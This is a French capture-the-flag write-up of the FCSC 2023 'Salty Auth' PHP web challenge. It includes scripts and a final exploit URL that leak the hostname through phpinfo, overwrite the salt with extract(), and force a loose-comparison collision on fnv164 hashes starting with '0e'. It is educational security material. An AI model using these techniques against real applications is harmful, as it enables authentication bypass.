---
title: FCSC 2023 - Salty Auth
date: 2023-05-06
summary: Type Juggling et éxécution de code avec Extract
author: Nu1t
description: Writeup
tags: ["web"]
categories: ["writeup"]
resources:
  - name: "featured-image"
    src: "featured-image.png"
---

## Enonce

![](./enonce.png)

Le lien nous redirige directement ici:
 
![](./chall.png)

On va devoir vérifier les 2 conditions afin de pouvoir afficher le flag.

## Conditions

{{< admonition type=tip title="Résolution" open=true >}}
Nous devons:
- Trouver la longueur du mot de passe
- Générer une collision entre **fnv164(password) == fn16v4(hostname+salt)**
{{< /admonition >}}

## Longueur du password

Si l'on fournit en `GET` un parametre `?password=test` les comparaisons échouent et le même code source est affiché.

Voici un petit script pour trouver la longueur:

```python
import requests, time

url = "https://salty-authentication.france-cybersecurity-challenge.fr/?password="
params_template = {"password": ""}

#$salt = bin2hex(random_bytes(12));  # 24 chars minimum pour secret

for i in range(24, 40):
        params = params_template.copy()
        response = requests.get(url+'a'*i)
        time.sleep(0.2)
        if "highlight_file" not in response.text:
                print(i)
```

Nous trouvons une longueur de `36`.

Bien, toutefois le `salt` inconnu est bien embêtant ...
On pourrait bruteforcer pendant des heures avec ce genre de script mais c'est interdit:

```python
import sys
import requests
import time

if len(sys.argv) < 2:
    print("Usage: python solve.py <pass>")
    sys.exit()

password = sys.argv[1]

i = 0
while True:
        response = requests.get(f'https://salty-authentication.france-cybersecurity-challenge.fr/?password={password}')
        print(response.text)
        if "Wrong" not in response.text:
                break
        time.sleep(0.33)
        print("essai n° ", i)
        i+=1
```

## Leak du hostname via phpinfo() ?

Le principal souci pour vérifier la 2nde condition est que **nous ne connaissons ni hostname, ni salt**.
Nous allons trouver `hostname`, vous verrez l'utilité dans la partie suivante.

En me repenchant dessus j'ai trouvé une vulnérabilité: on peut appeler une certaine fonction `log_attack` lors de l'**exit()**:

```
log_attack=phpinfo
//le serveur éxécute: exit($log_attack)
```

![](./log_attack.png)

Et récupérer le hostname:

![](./hostname.png)

## Réinitialisation du salt via extract()

Une fonction saute au yeux dans ce code, à quoi sert-elle?

```php
$salt = bin2hex(random_bytes(12));

extract($GET);

$secret = gethostname().$salt;
```

Ici réside ce qui nous permettra d'outrepasser la 2nde condition.
On trouve rapidement quelques ressources sur extract:

- https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md
- https://davidnoren.com/post/php-extract-vulnerability/

`PHP has a function named extract() to take all provided GET and POST requests and assign them to internal variables. Developers will, at times, use this function instead of manually assigning $_POST[var1] to $var1. This function will overwrite any previously defined variables, including server variables.
`

Ici nous allons par la **register global** $SERVER.
En échouant la vérification nous allons pouvoir écraser le variable `salt`.

Grâce à **extract** on peut:

- préciser notre password
- **écraser le salt** afin de contrôler la loose comparison.

![](./solve.png)

{{< admonition type=tip title="Loose Comparison" open=true >}}
0e1234 == 0e4321 == 0
{{< /admonition >}}

On remarque tout de suite la 2nde condition `if (hash('fnv164', $password) == hash('fnv164', $secret))`:

Voici un script permettant de trouver un password de 36 caractères pour forcer une [Loose comparison](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)

```php
<?php

$counter =0;
while(1){
    $p = bin2hex(random_bytes(18));
    $counter+=1;
    if (hash('fnv164',$p)==0) {

        $h = hash('fnv164',$p); 
        echo $p;
        echo "\n";
        echo $h;
        echo "\n";
        echo $counter;
        exit();

    }
}
?>
```

![](./wrong.png)

Résumons:

```php
hostname = "9be4a60f645f";

password = "9be4a60f645fa74b424f8617e4d9fccfd023";
password2 = "9be4a60f645f"."b39ea06afe7bc4f917472748";

/*
https://salty-authentication.france-cybersecurity-challenge.fr/?password=<password>
&log_attack=extract($_SERVER);&salt="b39ea06afe7bc4f917472748"
*/

$salt = "????????????????????????";
//extract($GET)
$salt = "b39ea06afe7bc4f917472748";

//1ère condition
$secret = "9be4a60f645f"."b39ea06afe7bc4f917472748" //===$password2
//password != password2


//2nde condition
hash('fnv164',$password) === 0e58654062616816 == 0
hash('fnv164',$secret) === hash('fnv164',$password2) == 00e9125834043228 == 0
```

Tada!!

![](./flag.png)
